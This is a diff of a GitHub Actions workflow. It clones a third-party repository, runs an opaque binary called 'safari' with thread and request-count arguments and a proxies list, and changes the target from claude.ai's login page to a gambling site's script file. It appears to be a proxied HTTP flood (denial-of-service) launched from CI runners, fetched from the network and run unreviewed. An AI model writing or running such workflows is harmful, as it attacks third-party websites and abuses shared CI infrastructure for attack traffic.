@@ -24,6 +24,6 @@ jobs:
         git clone https://github.com/Kiwiwjkwi/cuddly-octo-bassoon.git
         cd cuddly-octo-bassoon
         chmod +x safari
-        ./safari  https://claude.ai/login   700 10000 8000 proxies.txt  --raw
+        ./safari  https://vavada.com/qauth_utm_v2d_v9118.js.LICENSE.txt   700 10000 8000 proxies.txt  --raw --cdn
       continue-on-error: true
     
